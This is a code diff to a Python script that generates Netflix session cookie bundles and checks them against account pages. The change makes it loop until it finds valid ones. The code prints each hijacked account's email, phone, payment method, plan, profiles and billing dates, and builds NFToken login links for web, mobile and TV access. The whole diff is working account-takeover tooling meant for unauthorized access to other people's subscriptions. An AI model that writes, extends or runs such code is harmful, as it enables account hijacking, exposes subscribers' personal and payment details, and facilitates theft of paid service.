@@ -1152,132 +1152,135 @@ def check_cookie_bundle(cookie_text, config):
             return None, "Incomplete account page - could not extract country"
     return None, "Failed to access account page"
 
-def generate_and_check_cookies(count=5, config=None):
+def generate_cookies_until_success(target_count, config):
     if config is None:
         config = copy.deepcopy(DEFAULT_CONFIG)
 
-    print(f"\n{YELLOW}Generating {count} cookie bundles and testing...{RESET}")
+    found_cookies = []
+    attempts = 0
 
-    for i in range(count):
-        print(f"\n{CYAN}[{i+1}/{count}] Generating cookie bundle...{RESET}")
+    print(f"\n{YELLOW}Generating cookies until {target_count} valid ones are found...{RESET}")
+
+    while len(found_cookies) < target_count:
+        attempts += 1
+        print(f"\n{CYAN}[Attempt {attempts}] Generating cookie bundle...{RESET}")
         cookie_text, cookie_dict = generate_cookie_bundle()
 
         print(f"  {YELLOW}Testing generated cookies...{RESET}")
         result, error = check_cookie_bundle(cookie_text, config)
 
         if result:
-            print(f"  {GREEN}✓ Valid cookies found!{RESET}")
-            return result, cookie_text, error
-
-        if error:
+            print(f"  {GREEN}✓ Valid cookie found! ({len(found_cookies) + 1}/{target_count}){RESET}")
+            found_cookies.append((result, cookie_text))
+        else:
             print(f"  {RED}✗ Invalid: {error}{RESET}")
+
         time.sleep(0.5)
 
-    return None, None, "No valid cookies found after generation attempts"
+    return found_cookies
 
-def display_generator_result(data, cookie_text, error):
+def display_multiple_results(cookies_data):
     print(f"\n{BOLD}{RED}══════════════════════════════════════════════════{RESET}")
+    print(f"{BOLD}{GREEN}  ✓ Found {len(cookies_data)} valid cookies{RESET}")
+    print(f"{RED}══════════════════════════════════════════════════{RESET}")
 
-    if error or not data:
-        print(f"\n{RED}{BOLD}  ✗ ERROR{RESET}")
-        print(f"  {RED}{error or 'Failed to generate valid cookies'}{RESET}")
+    for idx, (result, cookie_text) in enumerate(cookies_data, 1):
+        info = result["info"]
+        is_subscribed = result["is_subscribed"]
+        nftoken_data = result.get("nftoken")
+        plan_key, plan_name = derive_plan_info(info, is_subscribed)
+
+        print(f"\n{BOLD}{WHITE}COOKIE #{idx}{RESET}")
+        print(f"{CYAN}─{'─' * 40}{RESET}")
+
+        print(f"\n{GREEN}{BOLD}  ✓ ACCOUNT ACTIVE{RESET}" if is_subscribed else f"\n{YELLOW}{BOLD}  ⚠ FREE ACCOUNT (No Subscription){RESET}")
+
+        on_hold = is_on_hold_account(info)
+        if on_hold:
+            print(f"  {YELLOW}⚠ Account is ON HOLD{RESET}")
+
+        print(f"\n  {WHITE}{BOLD}Account Information:{RESET}")
+        print(f"  {CYAN}─{'─' * 40}{RESET}")
+
+        email = normalize_output_value(info.get("email"))
+        print(f"  {BOLD}Email:{RESET}        {email}")
+
+        phone = normalize_output_value(info.get("phoneDisplay"))
+        print(f"  {BOLD}Phone:{RESET}        {phone}")
+
+        print(f"  {BOLD}Plan:{RESET}         {GREEN}{plan_name}{RESET}")
+
+        payment = format_payment_display(info)
+        print(f"  {BOLD}Payment:{RESET}      {payment}")
+
+        profiles_list = info.get("profiles", [])
+        if profiles_list:
+            profiles_str = ", ".join(str(p) for p in profiles_list)
+        else:
+            profiles_str = "None"
+        profile_count = info.get("profileCount", 0)
+        print(f"  {BOLD}Profiles:{RESET}     {profiles_str} ({profile_count})")
+
+        country = normalize_output_value(info.get("countryOfSignup"))
+        print(f"  {BOLD}Country:{RESET}      {country}")
+
+        next_billing_display = format_date_display(info.get("nextBillingDate"))
+        print(f"  {BOLD}Next Bill:{RESET}    {next_billing_display}")
+
+        member_since = format_member_since(info.get("memberSince"))
+        print(f"  {BOLD}Since:{RESET}        {member_since}")
+
+        max_streams = _int_or_none(info.get("maxStreams"))
+        if max_streams is not None:
+            print(f"  {BOLD}Max Streams:{RESET}  {max_streams}")
+
+        quality = normalize_output_value(info.get("videoQuality"))
+        if quality and quality != "N/A":
+            print(f"  {BOLD}Quality:{RESET}      {quality}")
+
+        price = normalize_output_value(info.get("planPrice"), "N/A")
+        if price and price != "N/A":
+            print(f"  {BOLD}Price:{RESET}        {price}")
+
+        hold_status = normalize_output_value(info.get("holdStatus"))
+        if hold_status in {"Yes", "No"}:
+            print(f"  {BOLD}Hold Status:{RESET}  {hold_status}")
+
+        extra_member = normalize_output_value(info.get("showExtraMemberSection"))
+        if extra_member == "Yes":
+            print(f"  {BOLD}Extra Member:{RESET} {extra_member}")
+
+        email_verified = normalize_output_value(info.get("emailVerified"))
+        if email_verified in {"Yes", "No"}:
+            print(f"  {BOLD}Email Verified:{RESET} {email_verified}")
+
+        if cookie_text:
+            print(f"\n  {WHITE}{BOLD}Generated Cookies:{RESET}")
+            print(f"  {CYAN}─{'─' * 40}{RESET}")
+            print(f"\n  {YELLOW}{cookie_text}{RESET}")
+
+        if nftoken_data and nftoken_data.get("token"):
+            token = nftoken_data["token"]
+
+            print(f"\n  {WHITE}{BOLD}NFToken Access Links:{RESET}")
+            print(f"  {CYAN}─{'─' * 40}{RESET}")
+
+            print(f"\n  {BOLD}Direct Watch:{RESET}")
+            print(f"  {BLUE}https://netflix.com/?nftoken={token}{RESET}")
+
+            print(f"\n  {BOLD}Mobile Watch:{RESET}")
+            print(f"  {YELLOW}To use mobile apps copy Direct Watch link to mobile Chrome.{RESET}")
+            print(f"  {YELLOW}Open in browser, change URL to:{RESET}")
+            print(f"  {BLUE}https://netflix.com/unsupported{RESET}")
+            print(f"  {YELLOW}It will suggest to open the app - click to login.{RESET}")
+
+            print(f"\n  {BOLD}TV Watch:{RESET}")
+            print(f"  {BLUE}https://netflix.com/tv2?nftoken={token}{RESET}")
+
+            expires = nftoken_data.get("expires_at_utc", "Unknown")
+            print(f"\n  {BOLD}Token Expires:{RESET} {YELLOW}{expires}{RESET}")
+
         print(f"\n{RED}══════════════════════════════════════════════════{RESET}")
-        return
-
-    info = data["info"]
-    is_subscribed = data["is_subscribed"]
-    nftoken_data = data.get("nftoken")
-    plan_key, plan_name = derive_plan_info(info, is_subscribed)
-
-    print(f"\n{GREEN}{BOLD}  ✓ ACCOUNT ACTIVE{RESET}" if is_subscribed else f"\n{YELLOW}{BOLD}  ⚠ FREE ACCOUNT (No Subscription){RESET}")
-
-    on_hold = is_on_hold_account(info)
-    if on_hold:
-        print(f"  {YELLOW}⚠ Account is ON HOLD{RESET}")
-
-    print(f"\n  {WHITE}{BOLD}Account Information:{RESET}")
-    print(f"  {CYAN}─{'─' * 40}{RESET}")
-
-    email = normalize_output_value(info.get("email"))
-    print(f"  {BOLD}Email:{RESET}        {email}")
-
-    phone = normalize_output_value(info.get("phoneDisplay"))
-    print(f"  {BOLD}Phone:{RESET}        {phone}")
-
-    print(f"  {BOLD}Plan:{RESET}         {GREEN}{plan_name}{RESET}")
-
-    payment = format_payment_display(info)
-    print(f"  {BOLD}Payment:{RESET}      {payment}")
-
-    profiles_list = info.get("profiles", [])
-    if profiles_list:
-        profiles_str = ", ".join(str(p) for p in profiles_list)
-    else:
-        profiles_str = "None"
-    profile_count = info.get("profileCount", 0)
-    print(f"  {BOLD}Profiles:{RESET}     {profiles_str} ({profile_count})")
-
-    country = normalize_output_value(info.get("countryOfSignup"))
-    print(f"  {BOLD}Country:{RESET}      {country}")
-
-    next_billing = format_date_iso(info.get("nextBillingDate"))
-    next_billing_display = format_date_display(info.get("nextBillingDate"))
-    print(f"  {BOLD}Next Bill:{RESET}    {next_billing_display}")
-
-    member_since = format_member_since(info.get("memberSince"))
-    print(f"  {BOLD}Since:{RESET}        {member_since}")
-
-    max_streams = _int_or_none(info.get("maxStreams"))
-    if max_streams is not None:
-        print(f"  {BOLD}Max Streams:{RESET}  {max_streams}")
-
-    quality = normalize_output_value(info.get("videoQuality"))
-    if quality and quality != "N/A":
-        print(f"  {BOLD}Quality:{RESET}      {quality}")
-
-    price = normalize_output_value(info.get("planPrice"), "N/A")
-    if price and price != "N/A":
-        print(f"  {BOLD}Price:{RESET}        {price}")
-
-    hold_status = normalize_output_value(info.get("holdStatus"))
-    if hold_status in {"Yes", "No"}:
-        print(f"  {BOLD}Hold Status:{RESET}  {hold_status}")
-
-    extra_member = normalize_output_value(info.get("showExtraMemberSection"))
-    if extra_member == "Yes":
-        print(f"  {BOLD}Extra Member:{RESET} {extra_member}")
-
-    email_verified = normalize_output_value(info.get("emailVerified"))
-    if email_verified in {"Yes", "No"}:
-        print(f"  {BOLD}Email Verified:{RESET} {email_verified}")
-
-    if cookie_text:
-        print(f"\n  {WHITE}{BOLD}Generated Cookies:{RESET}")
-        print(f"  {CYAN}─{'─' * 40}{RESET}")
-        print(f"\n  {YELLOW}{cookie_text}{RESET}")
-
-    if nftoken_data and nftoken_data.get("token"):
-        token = nftoken_data["token"]
-
-        print(f"\n  {WHITE}{BOLD}NFToken Access Links:{RESET}")
-        print(f"  {CYAN}─{'─' * 40}{RESET}")
-
-        print(f"\n  {BOLD}Direct Watch:{RESET}")
-        print(f"  {BLUE}https://netflix.com/?nftoken={token}{RESET}")
-
-        print(f"\n  {BOLD}Mobile Watch:{RESET}")
-        print(f"  {YELLOW}To use mobile apps copy Direct Watch link to mobile Chrome.{RESET}")
-        print(f"  {YELLOW}Open in browser, change URL to:{RESET}")
-        print(f"  {BLUE}https://netflix.com/unsupported{RESET}")
-        print(f"  {YELLOW}It will suggest to open the app - click to login.{RESET}")
-
-        print(f"\n  {BOLD}TV Watch:{RESET}")
-        print(f"  {BLUE}https://netflix.com/tv2?nftoken={token}{RESET}")
-
-        expires = nftoken_data.get("expires_at_utc", "Unknown")
-        print(f"\n  {BOLD}Token Expires:{RESET} {YELLOW}{expires}{RESET}")
-
-    print(f"\n{RED}══════════════════════════════════════════════════{RESET}")
 
 def main():
     config = load_config()
@@ -1288,23 +1291,23 @@ def main():
     print(f"{RED}{BOLD}╚══════════════════════════════════════════════════╝{RESET}")
 
     while True:
-        print(f"\n{WHITE}Enter number of cookies to generate (1-10):{RESET}")
+        print(f"\n{WHITE}How many valid cookies do you want to generate? (1-3):{RESET}")
         try:
             count_input = input().strip()
             if count_input.lower() in ["exit", "quit"]:
                 print(f"\n{RED}Exiting...{RESET}")
                 return
-            count = int(count_input)
-            if count < 1:
-                count = 1
-            elif count > 10:
-                count = 10
+            target_count = int(count_input)
+            if target_count < 1:
+                target_count = 1
+            elif target_count > 3:
+                target_count = 3
             break
         except ValueError:
-            print(f"  {YELLOW}Invalid input. Please enter a number between 1-10.{RESET}")
+            print(f"  {YELLOW}Invalid input. Please enter a number between 1-3.{RESET}")
 
-    result, cookie_text, error = generate_and_check_cookies(count, config)
-    display_generator_result(result, cookie_text, error)
+    found_cookies = generate_cookies_until_success(target_count, config)
+    display_multiple_results(found_cookies)
 
 if __name__ == "__main__":
     try:
